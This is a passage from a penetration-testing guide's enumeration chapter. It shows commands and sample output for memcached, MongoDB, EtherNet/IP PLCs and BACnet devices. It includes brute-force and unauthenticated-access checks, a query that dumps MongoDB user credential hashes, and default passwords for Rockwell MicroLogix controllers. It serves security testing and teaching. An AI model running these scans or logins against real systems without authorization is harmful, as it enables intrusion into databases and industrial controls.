<span class="go">STAT limit_maxbytes 67108864</span>
<span class="go">STAT accepting_conns 1</span>
<span class="go">STAT listen_disabled_num 0</span>
<span class="go">STAT threads 4</span>
<span class="go">STAT conn_yields 0</span>
<span class="go">STAT hash_power_level 16</span>
<span class="go">STAT hash_bytes 524288</span>
<span class="go">STAT hash_is_expanding 0</span>
<span class="go">STAT expired_unfetched 0</span>
<span class="go">STAT evicted_unfetched 0</span>
<span class="go">STAT bytes 87</span>
<span class="go">STAT curr_items 1</span>
<span class="go">STAT total_items 1</span>
<span class="go">STAT evictions 0</span>
<span class="go">STAT reclaimed 0</span>
<span class="go">END</span>
</pre></div>
</div>
<p>Sensepost has written a tool <a class="reference external" href="https://github.com/sensepost/go-derper">go-derper</a> and a article here <a class="reference external" href="https://www.sensepost.com/blog/2010/blackhat-write-up-go-derper-and-mining-memcaches/">blackhat-write-up-go-derper-and-mining-memcaches</a> Blackhat slides <a class="reference external" href="https://media.blackhat.com/bh-ad-10/Sensepost/BlackHat-AD-2010-Slaviero-Lifting-the-Fog-slides.pdf">Lifting the Fog</a></p>
</section>
</section>
</section>
<section id="port-27017-27018-mongodb">
<span id="mongodb-port-27017-and-port-27018"></span><h2>Port 27017/27018 - MongoDB<a class="headerlink" href="#port-27017-27018-mongodb" title="Link to this heading"></a></h2>
<p><a class="reference external" href="https://github.com/all3g/exploit-exercises/tree/master/mongodb">mongodb</a> provides a good walkthru how to check for vulns in mongodb;</p>
<section id="id81">
<h3>Metasploit<a class="headerlink" href="#id81" title="Link to this heading"></a></h3>
<section id="mongodb-login-utility">
<h4>MongoDB Login Utility<a class="headerlink" href="#mongodb-login-utility" title="Link to this heading"></a></h4>
<p>Module attempts to brute force authentication credentials for MongoDB. Note that, by default, MongoDB does not require authentication. This can be used to check if there is no-authentication on the MongoDB by setting blank_passwords to true. This can also be checked using the Nmap nse mongodb-brute</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/mongodb/mongodb_login</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] Scanning IP: 10.169.xx.xx</span>
<span class="go">[+] Mongo server 10.169.xx.xx dosn&#39;t use authentication</span>
</pre></div>
</div>
</section>
</section>
<section id="id82">
<h3>Nmap<a class="headerlink" href="#id82" title="Link to this heading"></a></h3>
<p>Nmap has three NSEs for mongo db databases</p>
<section id="mongodb-info">
<h4>Mongodb-info<a class="headerlink" href="#mongodb-info" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap 10.169.xx.xx -p 27017 -sV --script mongodb-info</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-03-26 02:23 IST</span>
<span class="go">Nmap scan report for mongod.example.com (10.169.xx.xx)</span>
<span class="go">Host is up (0.088s latency).</span>
<span class="go">PORT      STATE SERVICE VERSION</span>
<span class="go">27017/tcp open  mongodb MongoDB 2.6.9 2.6.9</span>
<span class="go">| mongodb-info:</span>
<span class="go">|   MongoDB Build info</span>
<span class="go">|     OpenSSLVersion =</span>
<span class="go">|     compilerFlags = -Wnon-virtual-dtor -Woverloaded-virtual -fPIC -fno-strict-aliasing -ggdb -pthread -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -pipe -Werror -O3 -Wno-unused-function -Wno-deprecated-declarations -fno-builtin-memcmp</span>
<span class="go">|     loaderFlags = -fPIC -pthread -Wl,-z,now -rdynamic</span>
<span class="go">|     version = 2.6.9</span>
<span class="go">|     ok = 1</span>
<span class="go">|     maxBsonObjectSize = 16777216</span>
<span class="go">|     debug = false</span>
<span class="go">|     bits = 64</span>
<span class="go">|     javascriptEngine = V8</span>
<span class="go">|     sysInfo = Linux build20.mongod.example.com 2.6.32-431.3.1.el6.x86_64 #1 SMP Fri Jan 3 21:39:27 UTC 2014 x86_64 BOOST_LIB_VERSION=1_49</span>
<span class="go">|     versionArray</span>
<span class="go">|       1 = 6</span>
<span class="go">|       2 = 9</span>
<span class="go">|       3 = 0</span>
<span class="go">|       0 = 2</span>
<span class="go">|     allocator = tcmalloc</span>
<span class="go">|     gitVersion = df313bc75aa94d192330cb92756fc486ea604e64</span>
<span class="go">|   Server status</span>
<span class="go">|     opcounters</span>
<span class="go">|       query = 19752</span>
<span class="go">|       update = 1374</span>
<span class="go">|       insert = 71735056</span>
<span class="go">|       command = 78465013</span>
<span class="go">|       delete = 121</span>
<span class="go">|       getmore = 4156</span>
<span class="go">|       connections</span>
<span class="go">|         available = 795</span>
<span class="go">|       totalCreated = 4487</span>
<span class="go">|       current = 24</span>
<span class="go">|     uptimeMillis = 3487298933</span>
<span class="go">|     localTime = 1458938079849</span>
<span class="go">|     metrics</span>
<span class="go">|       getLastError</span>
<span class="go">|         wtime</span>
<span class="go">|           num = 0</span>
<span class="go">|           totalMillis = 0</span>
<span class="go">|     uptimeEstimate = 3455635</span>
<span class="go">|     version = 2.6.9</span>
<span class="go">|     uptime = 3487299</span>
<span class="go">|     network</span>
<span class="go">|       bytesOut = 17159001651</span>
<span class="go">|       numRequests = 78517212</span>
<span class="go">|       bytesIn = 73790966211</span>
<span class="go">|     host = nvt-prod-05</span>
<span class="go">|     mem</span>
<span class="go">|       supported = true</span>
<span class="go">|       virtual = 344</span>
<span class="go">|       resident = 31</span>
<span class="go">|       bits = 64</span>
<span class="go">|     pid = 25964</span>
<span class="go">|     extra_info</span>
<span class="go">|       heap_usage_bytes = 2798848</span>
<span class="go">|       page_faults = 16064</span>
<span class="go">|       note = fields vary by platform</span>
<span class="go">|     asserts</span>
<span class="go">|       warning = 1</span>
<span class="go">|       regular = 1</span>
<span class="go">|       rollovers = 0</span>
<span class="go">|       user = 11344</span>
<span class="go">|       msg = 0</span>
<span class="go">|     process = mongos</span>
<span class="go">|_    ok = 1</span>

<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
<span class="go">Nmap done: 1 IP address (1 host up) scanned in 7.42 seconds</span>
</pre></div>
</div>
</section>
<section id="mongodb-database">
<h4>Mongodb-database<a class="headerlink" href="#mongodb-database" title="Link to this heading"></a></h4>
<p>To find the databases in the mongodb.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap 122.169.xx.xx -p 27017 -sV --script mongodb-databases.nse</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-03-26 02:23 IST</span>
<span class="go">Nmap scan report for mongod.example.com (10.169.xx.xx)</span>
<span class="go">Host is up (0.090s latency).</span>
<span class="go">PORT      STATE SERVICE VERSION</span>
<span class="go">27017/tcp open  mongodb MongoDB 2.6.9</span>
<span class="go">| mongodb-databases:</span>
<span class="go">|   ok = 1</span>
<span class="go">|   databases</span>
<span class="go">|     1</span>
<span class="go">|       shards</span>
<span class="go">|       rs0 = 1</span>
<span class="go">|         sizeOnDisk = 1</span>
<span class="go">|       empty = true</span>
<span class="go">|       name = test</span>
<span class="go">|     0</span>
<span class="go">|       shards</span>
<span class="go">|         rs0 = 21415067648</span>
<span class="go">|         rs1 = 17122197504</span>
<span class="go">|       sizeOnDisk = 38537265152</span>
<span class="go">|       empty = false</span>
<span class="go">|       name = genprod</span>
<span class="go">|     3</span>
<span class="go">|       sizeOnDisk = 16777216</span>
<span class="go">|       empty = false</span>
<span class="go">|       name = admin</span>
<span class="go">|     2</span>
<span class="go">|       sizeOnDisk = 50331648</span>
<span class="go">|       empty = false</span>
<span class="go">|       name = config</span>
<span class="go">|   totalSize = 38537265153</span>
<span class="go">|_  totalSizeMb = 36752</span>
</pre></div>
</div>
</section>
<section id="mongodb-bruteforce">
<h4>Mongodb-BruteForce<a class="headerlink" href="#mongodb-bruteforce" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap 10.169.xx.xx -p 27017 -sV --script mongodb-brute -n</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-03-26 02:28 IST</span>
<span class="go">Nmap scan report for 122.169.xx.xx</span>
<span class="go">Host is up (0.086s latency).</span>
<span class="go">PORT      STATE SERVICE VERSION</span>
<span class="go">27017/tcp open  mongodb MongoDB 2.6.9</span>
<span class="go">|_mongodb-brute: No authentication needed</span>
</pre></div>
</div>
</section>
</section>
<section id="id83">
<h3>Other<a class="headerlink" href="#id83" title="Link to this heading"></a></h3>
<section id="connection-string">
<h4>Connection String<a class="headerlink" href="#connection-string" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mongodb://[username:password@]host[:port][/[database][?options]]</span>

<span class="go">mongodb://     A required prefix to identify that this is a string in the standard connection format.</span>
<span class="go">username:password@     Optional. If specified, the client will attempt to log in to the specific database using these credentials after connecting to the mongod instance.</span>
<span class="go">host   Required. It identifies a server address to connect to. It identifies either a hostname, IP address, or UNIX domain socket.</span>

<span class="go">/database      Optional. The name of the database to authenticate if the connection string includes authentication credentials in the form of username:password@. If /database is not specified and the connection string includes credentials, the driver will authenticate to the admin database.</span>
</pre></div>
</div>
</section>
<section id="mongo-shell">
<h4>Mongo-shell<a class="headerlink" href="#mongo-shell" title="Link to this heading"></a></h4>
<p>This database can be connected using</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mongo 10.169.xx.xx /databasename</span>
<span class="go">MongoDB shell version: 2.4.10</span>
<span class="go">connecting to: 122.169.xx.xx/test</span>
</pre></div>
</div>
<p>Show DBS can be used to see the current databases;</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mongos&gt; show dbs</span>
<span class="go">admin        0.015625GB</span>
<span class="go">config       0.046875GB</span>
<span class="go">genprod      35.890625GB</span>
<span class="go">test (empty)</span>
</pre></div>
</div>
<p>Use command can be used select the database</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mongos&gt; use admin</span>
<span class="go">switched to db admin</span>
</pre></div>
</div>
<p>Show collections can be used to see the tables;</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">mongos&gt; show collections</span>
<span class="go">nxae</span>
<span class="go">system.indexes</span>
<span class="go">system.users</span>
<span class="go">system.version</span>
</pre></div>
</div>
<p>db.foo.find()                list objects in collection foo</p>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">db.system.users.find()</span>
<span class="go">{ &quot;_id&quot; : &quot;test.root&quot;, &quot;user&quot; : &quot;root&quot;, &quot;db&quot; : &quot;test&quot;, &quot;credentials&quot; : { &quot;MONGODB-CR&quot; : &quot;d6zzzdb4538zzz339acd585fa9zzzzzz&quot; }, &quot;roles&quot; : [  {  &quot;role&quot; : &quot;dbOwner&quot;,  &quot;db&quot; : &quot;test&quot; } ] }</span>
<span class="go">{ &quot;_id&quot; : &quot;genprod.root&quot;, &quot;user&quot; : &quot;root&quot;, &quot;db&quot; : &quot;genprod&quot;, &quot;credentials&quot; : { &quot;MONGODB-CR&quot; : &quot;d6zzzdb4538zzz339acd585fa9zzzzzz&quot; }, &quot;roles&quot; : [  {  &quot;role&quot; : &quot;dbOwner&quot;,  &quot;db&quot; : &quot;genprod&quot; } ] }</span>
</pre></div>
</div>
</div></blockquote>
<p>It is important that to have a look at the <a class="reference external" href="https://docs.mongodb.com/manual/reference/method/">Mongo Shell Methods</a> There are methods such as collection, cursor etc. In Collection, there are</p>
<ul class="simple">
<li><p>db.collection.deleteOne()     Deletes a single document in a collection.</p></li>
<li><p>db.collection.find()  Performs a query on a collection or a view and returns a cursor object.</p></li>
<li><p>db.collection.insert()        Creates a new document in a collection.</p></li>
<li><p>and others</p></li>
</ul>
<p>In cursor method, there are</p>
<ul>
<li><p>cursor.forEach()      Applies a JavaScript function for every document in a cursor. The following example invokes the forEach() method on the cursor returned by find() to print the name of each user in the collection:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">db.users.find().forEach( function(myDoc) { print( &quot;user: &quot; + myDoc.name ); } );</span>
</pre></div>
</div>
</li>
<li><p>cursor.toArray()      Returns an array that contains all documents returned by the cursor.</p></li>
<li><p>and others</p></li>
</ul>
</section>
</section>
</section>
<section id="port-44818-ethernetip-tcp-udp">
<span id="ethernetip-tcp-udp-port-44818"></span><h2>Port 44818 - EthernetIP-TCP-UDP<a class="headerlink" href="#port-44818-ethernetip-tcp-udp" title="Link to this heading"></a></h2>
<p>If we found TCP Port 44818, probably it’s running Ethernet/IP. Rockwell Automation/ Allen Bradley developed the protocol and is the primary maker of these devices, e.g. ControlLogix and MicroLogix, but it is an open standard and a number of vendors offer an EtherNet/IP interface card or solution.</p>
<p><a class="reference external" href="https://github.com/digitalbond/Redpoint">Redpoint</a> has released a NSE for enumeration of these devices</p>
<section id="id84">
<h3>Nmap<a class="headerlink" href="#id84" title="Link to this heading"></a></h3>
<section id="enip-enumerate">
<h4>enip-enumerate<a class="headerlink" href="#enip-enumerate" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 44818 -n --script enip-enumerate x.x.x.x -Pn</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-03-25 18:49 IST</span>
<span class="go">Nmap scan report for x.x.x.x</span>
<span class="go">Host is up (0.83s latency).</span>
<span class="go">PORT      STATE SERVICE</span>
<span class="go">44818/tcp open  EtherNet/IP</span>
<span class="go">| enip-enumerate:</span>
<span class="go">|   Vendor: Rockwell Automation/Allen-Bradley (1)</span>
<span class="go">|   Product Name: 1766-L32BXB B/10.00</span>
<span class="go">|   Serial Number: 0x40605446</span>
<span class="go">|   Device Type: Programmable Logic Controller (14)</span>
<span class="go">|   Product Code: 90</span>
<span class="go">|   Revision: 2.10</span>
<span class="go">|_  Device IP: 192.168.xx.xx</span>
</pre></div>
</div>
<p>Rockwell Automation has</p>
<ul class="simple">
<li><p>MicroLogix 1100: Default Username:password is administrator:ml1100</p></li>
<li><p>MicroLogix 1400: Default Username:password is administrator:ml1400 User manual is <a class="reference external" href="http://literature.rockwellautomation.com/idc/groups/literature/documents/um/1766-um002_-en-p.pdf">MicroLogix 1400</a> guest:guest is another default password.</p></li>
</ul>
</section>
</section>
</section>
<section id="port-47808-udp-bacnet">
<span id="udp-bacnet-port-47808"></span><h2>Port 47808 - UDP BACNet<a class="headerlink" href="#port-47808-udp-bacnet" title="Link to this heading"></a></h2>
<p>If we found UDP Port 47808 open, we can use BACnet-discover-enumerate NSE created by <a class="reference external" href="https://github.com/digitalbond/Redpoint">Redpoint</a> Should read <a class="reference external" href="http://www.digitalbond.com/blog/2014/03/26/redpoint-discover-enumerate-bacnet-devices/">Discover Enumerate bacnet devices</a></p>
<section id="bacnet-discover-enumerate">
<h3>BACNet-discover-enumerate<a class="headerlink" href="#bacnet-discover-enumerate" title="Link to this heading"></a></h3>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sU -p 47808 -n -vvv --script BACnet-discover-enumerate --script-args full=yes 182.X.X.X</span>
<span class="go">Nmap scan report for 182.X.X.X</span>
<span class="go">Host is up (0.11s latency).</span>
<span class="go">PORT      STATE SERVICE</span>
<span class="go">47808/udp open  BACNet -- Building Automation and Control Networks</span>
<span class="go">| BACnet-discover-enumerate:</span>
<span class="go">|   Vendor ID: Automated Logic Corporation (24)</span>
<span class="go">|   Vendor Name: Automated Logic Corporation</span>
<span class="go">|   Object-identifier: 2404999</span>
<span class="go">|   Firmware: BOOT(id=0,ver=0.01:001,crc=0x0000) MAIN(id=3,ver=6.00a:008,crc=0x2050)</span>
<span class="go">|   Application Software: PRG:carrier_19xrv_chiller_01_er_mv</span>
<span class="go">|   Object Name: device2404999</span>
<span class="go">|   Model Name: LGR1000</span>
<span class="go">|   Description: Device Description</span>
<span class="go">|   Location: Device Location</span>
<span class="go">|   Broadcast Distribution Table (BDT):</span>
<span class="go">|     182.X.X.X:47808</span>
<span class="go">|_  Foreign Device Table (FDT): Empty Table</span>
</pre></div>
</div>
<section id="id86">
<h4>Others<a class="headerlink" href="#id86" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/enddo/smod">MODBUS Pentest Framework</a></p></li>
</ul>
</section>
</section>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="LFF-IPS-P1-IntelligenceGathering.html" class="btn btn-neutral float-left" title="Intelligence Gathering" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="LFF-IPS-P3-Exploitation.html" class="btn btn-neutral float-right" title="Exploitation" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright Vijay Kumar &amp; Contributors.</p>
  </div>

   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(false);
      });
  </script> 

</body>
</html>